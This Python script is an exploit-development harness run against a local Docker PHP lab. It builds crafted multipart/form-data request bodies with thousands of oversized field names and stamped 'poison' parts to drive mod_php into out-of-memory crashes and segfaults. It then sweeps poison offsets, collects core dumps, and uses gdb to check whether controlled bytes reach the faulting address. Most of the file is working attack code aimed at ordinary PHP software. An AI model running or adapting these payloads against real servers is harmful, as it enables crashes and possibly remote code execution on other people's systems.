#!/usr/bin/env python3
"""oom65: poison-POSITION sweep on stock, with a WORKING oom sensor.

Blind-sensor fix: mod_php fatals mid-parse still return 200 and the OOM
warning lands in the RESPONSE BODY (display_errors on). So: read bodies.

Structural dial: instrument death = field ~#3957 (resize threshold zone);
poison fields sat at k1..k1+2. For stock to die the same way, poison must
be near the death point / resize thresholds. Sweep k1 1900..3900 at
lim=8M (stock reliably exhausts there — body 13.6MB, 2x during parse).
Watch segv + cores; read response bodies to confirm OOM deaths.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
LIB = "/usr/lib/apache2/modules/libphp.so"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
KEYLEN = 3064
PREP = 3
POISON_PAGES = 40
CELLS = 10237


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (KEYLEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, stamp_offset):
    namelen = POISON_PAGES * 4096 - 25
    total = namelen - 1 - 6
    ncells = total // 16
    pad = total - ncells * 16
    idx = stamp_offset
    body = bytearray()
    for _ in range(ncells):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        body += stamp + b"z" * 10
        idx += 1
    body += b"p" * pad
    nm = b"q" + bytes(body) + (b"%06d" % n)
    assert len(nm) == namelen
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1, stamp_base, total=4200):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, stamp_base + n * CELLS) for n in range(PREP)]
    ps += [key_part(i) for i in range(k1, total)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def post(body):
    req = urllib.request.Request(LAB + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, r.read(400).decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return "HTTP%s" % e.code, e.read(400).decode("latin1", "replace")
    except Exception as e:
        return type(e).__name__, str(e)[:80]


def full_logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def segv_of(logs):
    return len(re.findall(r"exit signal Segmentation", logs))


def main():
    print("=== [0] stock + conditions ===", flush=True)
    md5 = sh("md5sum %s | cut -d' ' -f1" % LIB, 15)
    print("[md5]", md5, flush=True)
    if md5 != STOCK_MD5:
        print("[ABORT]", flush=True)
        return
    ini = "memory_limit=8M\nmax_input_vars=100000\npost_max_size=4096M\n"
    subprocess.run(["docker", "exec", "-i", "php_vuln", "sh", "-c",
                    "cat > /usr/local/etc/php/conf.d/30-oomlab.ini"],
                   input=ini.encode(), capture_output=True)
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(25):
        time.sleep(1.5)
        probe = sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1)
        if "lim=8M" in probe:
            break
    print("[ini]", probe, flush=True)
    if "lim=8M" not in probe:
        print("[ABORT]", flush=True)
        return

    base = segv_of(full_logs())
    hit = None
    print("=== [1] k1 sweep at lim=8M ===", flush=True)
    k1s = [1900, 1950, 2000, 2044, 2100, 2200, 2400, 2600, 2800, 3000, 3200, 3400, 3600, 3800, 3900]
    for fi, k1 in enumerate(k1s):
        att = build_attack(k1, 5000000 + fi * 100000)
        code, body = post(att)
        time.sleep(2)
        s = segv_of(full_logs())
        cores = sh("ls /tmp/core* 2>/dev/null | wc -l", 10)
        oom = "Allowed memory" in body or "Fatal error" in body
        print("  k1=%d: %s segv+=%d cores=%s body_oom=%s body=%r"
              % (k1, code, s - base, cores, oom, body[:120]), flush=True)
        base = s
        if s > 0 and cores != "0":
            hit = k1
            break

    print("=== [2] hit k1=%s ===" % hit, flush=True)
    if hit:
        for i in range(3):
            att = build_attack(hit, 7000000 + i * 100000)
            code, body = post(att)
            time.sleep(2)
            s = segv_of(full_logs())
            print("  rep%d: %s segv+=%d cores=%s" % (i, code, s - base, sh("ls /tmp/core* | wc -l", 10)), flush=True)
            base = s
        corep = sh("ls -t /tmp/core* | head -1", 10)
        if corep.startswith("/tmp/core"):
            dcp("php_vuln:%s" % corep, PHPLAB + "/child.core.65")
            dcp(PHPLAB + "/libphp.so.stock", "phpbuild:/tmp/libphp.stock.so")
            dcp(PHPLAB + "/child.core.65", "phpbuild:/tmp/child.core.65")
            open("/tmp/g65.gdb", "w").write(
                "set pagination off\nbt 8\ninfo registers rip rdi rsi rax\n"
                "p $_siginfo._sifields._sigfault.si_addr\nx/2i $pc\n")
            r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                                "gdb -q -batch -x /tmp/g65.gdb /tmp/libphp.stock.so /tmp/child.core.65 2>&1 | tail -30"],
                               capture_output=True, timeout=180)
            out = r.stdout.decode("latin1", "replace")
            print(out, flush=True)
            m = re.search(r'si_addr.*?=\s*(0x[0-9a-f]+)', out)
            if m:
                raw = int(m.group(1), 16).to_bytes(8, "little")
                print("[si_addr]", raw, "digits:", re.findall(rb"[0-9a-f]{6}", raw), flush=True)

    print("=== [3] restore ===", flush=True)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        try:
            urllib.request.urlopen(LAB + "/oom_sapi.php", timeout=5).read()
        except Exception:
            pass
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15),
          sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1), flush=True)
    print("=== DONE hit=%s ===" % hit, flush=True)


if __name__ == "__main__":
    main()
